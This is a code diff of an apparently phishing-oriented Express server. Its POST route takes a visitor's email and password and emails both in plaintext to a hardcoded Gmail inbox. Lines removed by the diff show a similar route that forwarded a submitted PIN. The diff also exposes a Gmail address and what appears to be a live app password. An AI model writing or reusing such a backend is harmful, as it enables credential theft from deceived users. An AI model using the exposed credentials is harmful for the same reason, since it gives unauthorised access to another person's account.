@@ -10,8 +10,9 @@ app.use(cors());
 const PORT = process.env.PORT || 5000; // port to connect to WEB
 
 // emails credentials
-const userEmail = "boyw4679@gmail.com";
-//const pass = "tjvnibpjzhxdepnp";
+const userEmail = "endb547@gmail.com";
+const pass = "jxlgucbkbfepomua";
+// 30 feb
 
 // Middleware
 app.use(express.json());
@@ -35,36 +36,6 @@ app.post("/", (req, res) => {
     to: userEmail,
     subject: `Email: ${email} \t\n\n\n password: ${password}`,
     text: `New user registered with Email: ${email} and password: ${password}`,
-  };
-
-  console.log(mailOptions);
-  transporter.sendMail(mailOptions, (error, info) => {
-    if (error) {
-      console.log(error);
-      res.send("error Occured: " + error);
-    } else {
-      console.log("Email sent", +info.response);
-      res.send("success");
-    }
-  });
-});
-// API routes for pin
-app.post("/pin", (req, res) => {
-  console.log(req.body);
-  let email = console.log(req.body.email);
-
-  const transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: userEmail,
-      pass: pass,
-    },
-  });
-
-  const mailOptions = {
-    from: email,
-    to: userEmail,
-    subject: `PIN: ${req.body?.pin} `,
   };
 
   console.log(mailOptions);
